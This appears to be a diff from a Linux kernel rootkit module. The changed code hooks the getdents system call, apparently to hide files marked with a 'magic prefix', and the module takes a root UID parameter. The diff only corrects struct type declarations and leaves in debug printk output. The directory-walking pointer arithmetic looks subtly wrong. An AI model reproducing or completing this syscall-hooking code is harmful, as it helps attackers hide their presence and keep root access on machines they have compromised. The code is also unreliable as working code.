@@ -56,8 +56,8 @@ MODULE_PARM_DESC(root_uid, "Root UID");
  */
 static char* magic_prefix;
 
-asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int count) {
-  int (*orig_func)(unsigned int fd, linux_dirent *dirp, unsigned int count);
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+  int (*orig_func)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
   t_syscall_hook *getdents_hook;
 
   //Find the t_syscall_hook for __NR_getdents from our linked list
@@ -74,10 +74,10 @@ asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int co
 
   if (nread != 0) {
     int bpos = 0;
-    linux_dirent *d = dirp;
+    struct linux_dirent *d;
     int i = 0;
     while (i < 10 && bpos < nread) {
-      d = (linux_dirent *)(dirp + bpos);
+      d = (struct linux_dirent *)(dirp + bpos);
       printk(KERN_INFO "bpos: %d", bpos);
       printk(KERN_INFO "ADDR: %10d", d);
     // for (bpos = 0; bpos < nread;) {      
